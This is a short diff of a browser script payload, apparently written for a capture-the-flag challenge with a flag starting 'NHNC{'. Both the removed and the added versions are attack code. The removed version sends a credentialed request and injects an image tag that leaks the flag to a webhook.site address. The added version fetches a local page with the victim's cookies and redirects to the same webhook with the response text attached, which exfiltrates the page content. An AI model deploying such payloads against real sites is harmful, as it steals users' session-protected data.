@@ -1,13 +1,11 @@
 <script>
-fetch('http://127.0.0.1:5000/guess', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/x-www-form-urlencoded'
-  },
-  body: new URLSearchParams({
-    guess: "NHNC{",
-    note: "<img src='http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?flag=NHNC{'/>"
-  }),
-  credentials: 'include' // 🔥 Bắt buộc để cookie được gửi đi 
-});
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','http://127.0.0.1:5000/',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?source='+this.responseText;
+};
 </script>
